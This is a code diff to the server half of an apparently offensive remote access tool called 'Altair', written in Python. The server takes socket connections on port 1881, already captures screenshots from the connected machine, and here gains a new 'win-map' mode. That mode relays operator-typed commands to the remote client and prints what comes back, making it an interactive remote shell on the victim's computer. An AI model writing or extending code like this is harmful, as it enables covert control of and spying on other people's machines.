@@ -24,7 +24,7 @@ c$$$cc$$$c  '''    $  '''    $c$$$cc$$$c  '''    $  '''    $$$$  $$$ "Y$c$$
 \t\tgithub: https://github.com/Arif-Helmsys
 \t\t     Assassin Name: Altair
 """
-ip = "192.168.1.5"
+ip = ""
 port = 1881
 state = False
 print(f"{random.choice(Console.SHAKER)}{banner}")
@@ -124,6 +124,20 @@ class Server(socket.socket):
                         remaining -= len(rbuf)
                         ssOpen.write(rbuf)
                 print(f"\t{Console.CYAN}  ╰──/{Console.CYAN}screenshot saved".expandtabs(5))
+            
+            elif _input == AltairCommandList.WIN_MAP:
+                client_socket.send(AltairCommandList.WIN_MAP.encode())
+                while True:
+                    _inp = Console._input_(self,f"{Console.CYAN}\t    ├──({Console.BOLD}{Console.PURPLE}assassin@win-map{Console.CYAN}){Console.DEFAULT}{Console.CYAN}\n\t   ╰──────{Console.RED}{Console.BOLD}# ".expandtabs(4))
+                    if _inp == "":
+                        print(f"{Console.CYAN}\t      ╰──/{Console.YELLOW}Please No Epmty")
+                    else:
+                        client_socket.send(_inp.encode())
+                        recv_cmd = client_socket.recv(1024).decode()
+                        if recv_cmd == "exited":
+                            break
+                        print(f"{recv_cmd}")
+
 
             elif _input == AltairCommandList.INFO:
                 client_socket.send(AltairCommandList.INFO.encode())
